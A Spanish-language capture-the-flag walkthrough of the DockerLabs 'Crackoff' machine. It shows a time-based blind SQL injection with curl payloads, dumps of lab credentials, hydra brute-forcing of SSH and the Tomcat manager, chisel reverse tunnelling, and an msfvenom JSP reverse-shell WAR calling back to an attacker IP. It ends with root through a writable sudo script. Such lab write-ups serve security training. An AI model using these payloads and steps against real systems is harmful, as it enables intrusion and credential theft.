![Screenshot](/hard/Crackoff/Images/machine.png)

Dificultad: **Hard**

Creado por: **d1se0**

# Pasos para pwn 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🪓 [Explotación](#explotación)
* 🚩 [Escalada de Privilegios](#escalada-de-privilegios)

---

## 🛠️  Técnicas: SQLI Blind basada en tiempo, creación de exploit propio, fuerza bruta con hydra, reenvío de puertos, exploit de tomcat, escalada de privilegios mediante archivo sh

---

Primero nos aseguramos de que la máquina esté activa, podemos hacer esto con el comando **ping**

```ruby
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/crackoff]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.176 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.096 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.089 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2053ms
rtt min/avg/max/mdev = 0.089/0.120/0.176/0.039 ms
```

Ahora, podemos comenzar nuestra fase de **reconocimiento**.

---
# Reconocimiento

Primero usamos **nmap** para descubrir qué puertos están abiertos en el objetivo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-03 18:36 -0500
Initiating ARP Ping Scan at 18:36
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:36, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:36
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:36, 3.55s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000029s latency).
Scanned at 2026-01-03 18:36:15 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.24 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, comenzando desde el puerto 1 hasta el puerto 65,535.

**-n** <- Con este argumento nmap omitirá la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser muy lento en algunos casos.

**-sS** <- Con este argumento nmap realizará un escaneo sigiloso, esto significa que el handshake de 3 vías no se completará, y también hace el escaneo un poco más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap también omitirá la fase de descubrimiento de host, esto significa que nmap tratará la máquina como activa y realizará el escaneo inmediatamente.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, esto significa que si nmap descubre un puerto abierto inmediatamente nos lo reportará mientras el escaneo continúa.

**--open** <- Con este argumento le estamos diciendo a nmap que solo filtre los puertos abiertos.

Una vez que el escaneo concluye podemos ver 2 puertos abiertos:

- puerto 22 (ssh / Secure Shell)
- puerto 80 (http / Hyper-Text Transfer Protocol)

Pero necesitamos saber más sobre estos puertos como las versiones que están ejecutando y qué tecnologías.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target
```

**-p22,80** <- Con este argumento nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap escaneará para cada puerto su versión para encontrar posibles vulnerabilidades sobre sistemas no actualizados, y también hará un escaneo con algunos scripts que ejecuta nmap, para encontrar más sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap nos da y la guardamos como un archivo xml.

**--stats-every=1m** <- Con este argumento recibimos estadísticas del escaneo cada 1 minuto, esto puede tener minutos (m) y segundos (s)

Después de que el escaneo termine obtenemos la salida en un archivo xml, hacemos esto para crear una página html para ver la información más fácilmente y más agradable a la vista.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo xml a un archivo html, ahora vamos a abrirlo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ open target.html 
```

Y podemos ver esto en nuestro navegador.

![Screenshot](/hard/Crackoff/Images/image1.png)

Podemos ver que es mucho más bonito y legible.

Y el puerto 80 parece ser un sitio web, podemos usar **whatweb** para saber qué tecnologías usa este sitio web.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[CrackOff - Bienvenido]
```

Parece que usa **apache**, pero eso es todo, así que echemos un vistazo con nuestro navegador.

![Screenshot](/hard/Crackoff/Images/image2.png)

Parece que podemos iniciar sesión, así que intentémoslo.

![Screenshot](/hard/Crackoff/Images/image3.png)

Voy a intentar iniciar sesión con algo como admin:admin

![Screenshot](/hard/Crackoff/Images/image4.png)

Y podemos ver que nos redirige a esta página **error.php**.

Puedo intentar hacer una **SQLI** y veamos si funciona en la página de inicio de sesión.

En este caso voy a usar el siguiente payload: **admin' or 1=1-- -** y **cualquier** contraseña.

![Screenshot](/hard/Crackoff/Images/image5.png)

Y podemos ver que omitimos la página de inicio de sesión, y esto es un panel de administración, pero si intentamos hacer algo o mirar en el código fuente, no encontramos nada útil.

Así que voy a echar un vistazo al código fuente de la página de inicio de sesión, a ver si podemos encontrar algo.

```html
<form action="db.php" method="post">
	<input type="text" name="username" placeholder="Nombre de Usuario" required>
	<input type="password" name="password" placeholder="Contraseña" required>
	<input type="submit" value="Iniciar Sesión">
</form>
```

Y podemos ver que el nombre de usuario y la contraseña están haciendo un post a otra página **db.php**

Así que veamos si podemos echar un vistazo con **curl**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ curl http://172.17.0.2/db.php
Consulta SQL: SELECT * FROM users WHERE username = '' AND password = ''<br>
```

Y podemos ver la consulta que está usando.

Así que voy a hacer una solicitud POST para enviar el nombre de usuario y la contraseña y ver qué sucede.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ curl -X POST http://172.17.0.2/db.php -d "username=admin&password=test"
Consulta SQL: SELECT * FROM users WHERE username = 'admin' AND password = 'test'<br>
```

Y podemos ver la consulta, enviando el nombre de usuario y la contraseña y esto es vulnerable a una sqli, así que intentemos ver si podemos hacer una sqli basada en union.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ curl -X POST http://172.17.0.2/db.php -d "username=admin' union select 1,2,3,4,5-- -&password=test"
Consulta SQL: SELECT * FROM users WHERE username = 'admin' union select 1,2,3,4,5-- -' AND password = 'test'<br>
```

Pero no podemos ver nada.

Y después de probar algunos payloads, no podemos ver nada, probablemente una SQLI Blind, en particular la que funciona es la **SQLI Blind basada en tiempo**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ curl -X POST http://172.17.0.2/db.php -d "username=admin' or sleep(0.3)-- -&password=test"

......

# 3 segundos después...

Consulta SQL: SELECT * FROM users WHERE username = 'admin' or sleep(0.3)-- -' AND password = 'test'<br>
```

cuando hacemos **sleep(0.3)** por cada decimal es igual a 1 segundo, así que estoy esperando la respuesta al menos 3 segundos.

Podemos intentar enumerar las bases de datos, tablas, columnas y datos usando esta función sleep.

Podemos intentar hacer un exploit que vaya carácter por carácter y verifique si el carácter es válido, luego espere 1 segundo, y cuente la cantidad de tiempo para recibir la respuesta de la página, si la cantidad de tiempo de la respuesta es igual o mayor a 1 segundo eso significa que el carácter es válido.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ curl -X POST http://172.17.0.2/db.php -d "username=admin' or if(substr((select schema_name from information_schema.schemata limit 0,1),1,1)='i',sleep(0.3),1)-- -&password=test"

............

# 3 segundos después

Consulta SQL: SELECT * FROM users WHERE username = 'admin' or if(substr((select schema_name from information_schema.schemata limit 0,1),1,1)='i',sleep(0.3),1)-- -' AND password = 'test'<br>
```

Con este payload estamos obteniendo la primera base de datos que seguramente es **information_schema** y con la función **substr** vamos carácter por carácter, y estamos verificando si el primer carácter de la primera base de datos es igual a **"i"** entonces vamos a recibir la respuesta 3 segundos después, si no inmediatamente.

---
# Explotación

Podemos hacer nuestro propio exploit para hacer esto automáticamente por nosotros, o puedes usar **sqlmap** si quieres.

Si quieres el exploit está en este repositorio, puedes verlo [aquí](/hard/Crackoff/exploit.py)

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ python3 exploit.py 
[↖] Payload: or if(substr((select schema_name from information_schema.schemata limit 3,1),15,1)='b',sleep(0.1),1)-- -
[+] Enumerating...: All the databases has been obtained!

[*] Total databases found: 4

[*] The length of the database 0 is: 18
[*] The length of the database 1 is: 18
[*] The length of the database 2 is: 11
[*] The length of the database 3 is: 15

----------DATABASES----------

[!] Database: information_schema
[!] Database: performance_schema
[!] Database: crackoff_db
[!] Database: crackofftrue_db

[i] Select a database:
```

Podemos ver que existen 2 bases de datos:

 - **crackoff_db**
 - **crackofftrue_db**

Voy a seleccionar la segunda base de datos, la verdadera.

```c
[i] Select a database: crackofftrue_db
[+] Enumerating...: All the tables are obtained!

[*] Tables in total: 1

[*] The length of the table 0 is: 5

----------TABLES----------

[!] Table: users

[i] Select a table:
```

Podemos ver que existe una tabla (users) de la base de datos **crackofftrue_db**

Así que seleccionemos entonces la tabla users para recibir información de las columnas de esa tabla.

```c
[i] Select a table: users
[+] Enumerating...: All the columns are obtained!

[*] Columns in total: 5

[*] The length of the column 0 is: 2
[*] The length of the column 1 is: 4
[*] The length of the column 2 is: 2
[*] The length of the column 3 is: 8
[*] The length of the column 4 is: 8

----------COLUMNS----------

[!] Column: id
[!] Column: name
[!] Column: id
[!] Column: name
[!] Column: id
[!] Column: username
[!] Column: password

[i] Select the columns:
```

Podemos ver que existen múltiples columnas, sin embargo, vamos a obtener la información de las columnas username y password.

```c
[i] Select the columns: username,password
[▝] Getting data...: Row 11: badmenandwomen

[*] Rows in total 12

[*] The length of the row 0 from the column username is: 7
[*] The length of the row 1 from the column username is: 8
[*] The length of the row 2 from the column username is: 5
[*] The length of the row 3 from the column username is: 6
[*] The length of the row 4 from the column username is: 3
[*] The length of the row 5 from the column username is: 5
[*] The length of the row 6 from the column username is: 6
[*] The length of the row 7 from the column username is: 4
[*] The length of the row 8 from the column username is: 5
[*] The length of the row 9 from the column username is: 16
[*] The length of the row 10 from the column username is: 4
[*] The length of the row 11 from the column username is: 5
[*] The length of the row 0 from the column password is: 11
[*] The length of the row 1 from the column password is: 17
[*] The length of the row 2 from the column password is: 14
[*] The length of the row 3 from the column password is: 24
[*] The length of the row 4 from the column password is: 12
[*] The length of the row 5 from the column password is: 13
[*] The length of the row 6 from the column password is: 25
[*] The length of the row 7 from the column password is: 12
[*] The length of the row 8 from the column password is: 13
[*] The length of the row 9 from the column password is: 18
[*] The length of the row 10 from the column password is: 10
[*] The length of the row 11 from the column password is: 14

----------DATA----------

[!] Row 0: rejetto
[!] Row 1: tomitoma
[!] Row 2: alice
[!] Row 3: whoami
[!] Row 4: pip
[!] Row 5: rufus
[!] Row 6: jazmin
[!] Row 7: rosa
[!] Row 8: mario
[!] Row 9: veryhardpassword
[!] Row 10: root
[!] Row 11: admin
[!] Row 0: password123
[!] Row 1: alicelaultramejor
[!] Row 2: passwordinhack
[!] Row 3: supersecurepasswordultra
[!] Row 4: estrella_big
[!] Row 5: colorcolorido
[!] Row 6: ultramegaverypasswordhack
[!] Row 7: unbreackroot
[!] Row 8: happypassword
[!] Row 9: admin12345password
[!] Row 10: carsisgood
[!] Row 11: badmenandwomen

[!] Row 0 -> rejetto:password123
[!] Row 1 -> tomitoma:alicelaultramejor
[!] Row 2 -> alice:passwordinhack
[!] Row 3 -> whoami:supersecurepasswordultra
[!] Row 4 -> pip:estrella_big
[!] Row 5 -> rufus:colorcolorido
[!] Row 6 -> jazmin:ultramegaverypasswordhack
[!] Row 7 -> rosa:unbreackroot
[!] Row 8 -> mario:happypassword
[!] Row 9 -> veryhardpassword:admin12345password
[!] Row 10 -> root:carsisgood
[!] Row 11 -> admin:badmenandwomen
```

Obtuvimos todas las contraseñas, y también este script guarda los resultados por cada columna.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ cat results_column_password 
password123
alicelaultramejor
passwordinhack
supersecurepasswordultra
estrella_big
colorcolorido
ultramegaverypasswordhack
unbreackroot
happypassword
admin12345password
carsisgood
badmenandwomen
```

Así que ahora vamos a hacer fuerza bruta a ssh con estos usuarios y contraseñas con **hydra**.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ hydra -t 16 -L results_column_username -P results_column_password ssh://172.17.0.2 

[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: rosa   password: [REDACTED]
```

¡Y podemos iniciar sesión como el usuario **rosa** con esta contraseña!

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ ssh rosa@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:xTaUk/NeYehBX3OaRhAZ579EhfX/Lv9wCRGdUAaRBRc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
rosa@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.17.10+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
rosa@ba7c6f284f7c:~$
```

¡Y estamos dentro!

---
# Escalada de Privilegios

Después de intentar un montón de métodos para tratar de escalar privilegios, podemos intentar ver qué puertos están abiertos dentro de la máquina con **netstat**

```r
rosa@ba7c6f284f7c:~$ netstat -aon
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0    216 172.17.0.2:22           172.17.0.1:52148        ESTABLISHED on (0.20/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  3      [ ]         STREAM     CONNECTED     4198772  
unix  2      [ ]         STREAM     CONNECTED     4198423  
unix  2      [ ]         STREAM     CONNECTED     1450790  
unix  3      [ ]         STREAM     CONNECTED     4198773  
unix  2      [ ACC ]     STREAM     LISTENING     1450772  /var/run/mysqld/mysqlx.sock
unix  2      [ ACC ]     STREAM     LISTENING     1451615  /var/run/mysqld/mysqld.sock
```

Podemos ver algunos puertos que no podemos ver desde afuera.

Que son los siguientes:

- **127.0.0.1:8005**
- **127.0.0.1:8080**

Para echar un vistazo a estos puertos podemos usar **chisel** y hacer algo de reenvío de puertos, para obtener acceso desde estos puertos a nuestra máquina de ataque.

Entonces vamos a transferir **chisel** a la máquina objetivo, podemos usar **scp** aprovechando que tenemos la contraseña de **rosa**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ scp /usr/bin/chisel rosa@172.17.0.2:/home/rosa
rosa@172.17.0.2's password: 
chisel
```

Bien, así que en nuestra máquina de ataque vamos a crear un servidor chisel para recibir conexiones.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ chisel server --reverse -p 1234
2026/01/03 20:12:07 server: Reverse tunnelling enabled
2026/01/03 20:12:07 server: Fingerprint aUqiDCkZDz+yPJDtiAfvUPpI2bGLr6p/CS1E0n2kHT8=
2026/01/03 20:12:07 server: Listening on http://0.0.0.0:1234
```

Bien, así que en la máquina objetivo vamos a conectarnos a nuestra máquina.

```r
rosa@ba7c6f284f7c:~$ ./chisel client 192.168.0.20:1234 R:80:127.0.0.1:8080 R:85:127.0.0.1:8005
2026/01/04 02:16:35 client: Connecting to ws://192.168.0.20:1234
2026/01/04 02:16:35 client: Connected (Latency 1.335756ms)
```

Así que estamos haciendo que el puerto 80 de NUESTRA máquina sea el localhost de la máquina objetivo en el puerto 8080, y lo mismo con el puerto 85.

Así que vamos a ejecutar un escaneo de **nmap** para saber sobre estos 2 puertos.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ nmap -p80,85 -sCV localhost -oX reverse
```

estamos guardando la salida una vez más en formato xml, así que haciendo el mismo proceso para convertir el archivo xml a archivo html.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ xsltproc reverse -o reverse.html
```

y vamos a abrirlo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ open reverse.html
```

![Screenshot](/hard/Crackoff/Images/image6.png)

Podemos ver que el puerto 80 que hicimos con chisel es un sitio web tomcat, así que echemos un vistazo.

![Screenshot](/hard/Crackoff/Images/image7.png)

Así que podemos iniciar sesión en la aplicación manager, necesitamos iniciar sesión, podemos usar una vez más **hydra** y las credenciales que obtuvimos antes de crackofftrue_db.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ hydra -t1 -V -I -L results_column_username -P results_column_password http-get://localhost/manager/html
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-04 00:14:05
[DATA] max 1 task per 1 server, overall 1 task, 144 login tries (l:12/p:12), ~144 tries per task
[DATA] attacking http-get://localhost:80/manager/html
[ATTEMPT] target localhost - login "rejetto" - pass "badmenandwomen" - 12 of 144 [child 0] (0/0)
[ATTEMPT] target localhost - login "tomitoma" - pass "password123" - 13 of 144 [child 0] (0/0)
[ATTEMPT] target localhost - login "tomitoma" - pass "alicelaultramejor" - 14 of 144 [child 0] (0/0)
[ATTEMPT] target localhost - login "tomitoma" - pass "passwordinhack" - 15 of 144 [child 0] (0/0)
[ATTEMPT] target localhost - login "tomitoma" - pass "supersecurepasswordultra" - 16 of 144 [child 0] (0/0)
[80][http-get] host: localhost   login: tomitoma   password: [REDACTED]
```

¡Y obtenemos el usuario **tomitoma** y también su contraseña!

![Screenshot](/hard/Crackoff/Images/image8.png)

¡Y estamos dentro!

Así que el proceso para obtener una reverse shell desde un tomcat es muy simple, podemos usar **msfvenom** para crear un archivo WAR malicioso con el lenguaje java.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.20 LPORT=1111 -f war -o funny.war
Payload size: 1094 bytes
Final size of war file: 1094 bytes
Saved as: funny.war
```

Después de crear el archivo war malicioso, cuando lo usamos, obtenemos acceso una vez más al sistema casi seguramente como el usuario **tomcat** a nuestra máquina en el puerto 1111.

Así que el proceso para subir el archivo war no es muy complejo.

![Screenshot](/hard/Crackoff/Images/image9.png)

Después de seleccionarlo y desplegarlo, usamos **netcat** para estar en modo escucha y obtener la conexión del sistema en nuestra máquina de ataque.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
```

**-l**  <- Este argumento hace que netcat esté en modo escucha.

**-v** <- Este argumento activa el modo **verbose**, esto nos mostrará con más detalle la conexión que recibimos.

**-n** <- Esto hace que netcat omita la búsqueda DNS, y solo use la dirección IP directamente.

**-p** <- El puerto en el que estamos escuchando, puede ser cualquiera, si no está siendo usado actualmente.

Así que entonces vamos a hacer clic en el archivo **funny**.

![Screenshot](/hard/Crackoff/Images/image10.png)

Cuando hacemos clic en él, accedemos una vez más al sistema con esta reverse shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 42170
whoami
tomcat
```

¡Y estamos dentro una vez más!

Así que necesitamos modificar esta shell, es muy fea así que vamos a hacerle un tratamiento.

Primero que nada hacemos esto:

```r
script /dev/null -c bash
Script started, output log file is '/dev/null'.
tomcat@a0cfcb8e06c7:/$
```

Este comando crea una nueva sesión bash con **script** y **/dev/null** como archivo de salida, porque script registra cada comando que ejecutamos en un log, pero con la ruta /dev/null, hacemos que el log no pueda registrar comandos, y **-c bash** hace que script ejecute la shell con bash.

Hacemos esto porque queremos usar CTRL + C y más funciones de bash.

Cuando ejecutamos esto, suspendemos nuestra reverse shell por un momento.

Luego ejecutamos el siguiente comando en nuestra máquina de ataque:

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal.

**raw** <- Con raw estamos haciendo que todos los datos de salida y entrada sean en crudo.

**-echo** <- Con esto estamos haciendo que si ejecutamos un comando no se imprima de nuevo en la salida.

**; fg** <- Y con esto reanudamos nuestra reverse shell de nuevo.

Cuando ejecutamos este comando reseteamos el xterm:

```r
tomcat@a0cfcb8e06c7:/$ reset xterm
```

Esto va a resetear la terminal.

Si queremos limpiar nuestra terminal no podemos porque el term va a ser diferente del xterm, que tiene esta función. Podemos hacer esto de la siguiente manera para poder limpiar nuestra pantalla si se pone fea:

```r
tomcat@a0cfcb8e06c7:/$ export TERM=xterm
```

Y una última cosa, ¡si notamos que la visualización de la terminal es muy pequeña!

Podemos ajustar esto para que sea más grande con el siguiente comando:

```r
tomcat@a0cfcb8e06c7:/$ stty rows {num} columns {num}
```

¡y finalmente se ve mucho mejor!

Si verificamos cómo escalar privilegios podemos encontrar que tenemos un privilegio de **SUDOER**

```r
tomcat@a0cfcb8e06c7:/$ sudo -l
Matching Defaults entries for tomcat on a0cfcb8e06c7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tomcat may run the following commands on a0cfcb8e06c7:
    (ALL) NOPASSWD: /opt/tomcat/bin/catalina.sh
```

Y vemos que **cualquier** usuario puede ejecutar el script **catalina.sh** incluso como el usuario **root**.

Podemos verificar si tenemos permisos para leer o modificar este script, podemos ver esto:

```r
tomcat@a0cfcb8e06c7:/$ ls -l /opt/tomcat/bin/catalina.sh
-rwxr-xr-x 1 tomcat tomcat 25323 Aug  2  2024 /opt/tomcat/bin/catalina.shh
```

¡Y somos los propietarios de este script!

Así que podemos modificarlo para obtener una shell bash y dejar que el usuario **root** lo ejecute.

Vamos a abrirlo con nano:

```r
tomcat@a0cfcb8e06c7:/$ nano /opt/tomcat/bin/catalina.sh
```

Y modificamos las siguientes líneas del script:

```bash
#!/bin/sh

bash
```

Así que cuando el usuario **root** ejecute esto, obtenemos acceso con una shell como el usuario root.

```c
tomcat@a0cfcb8e06c7:/$ sudo /opt/tomcat/bin/catalina.sh
root@a0cfcb8e06c7:/# whoami
root
```

¡Somos root y podemos ver la flag!

```c
root@a0cfcb8e06c7:/# cat ~/root.txt 
c33b3d6c28dddad9fadd90b81fc57d24
```

***...pwned..!***
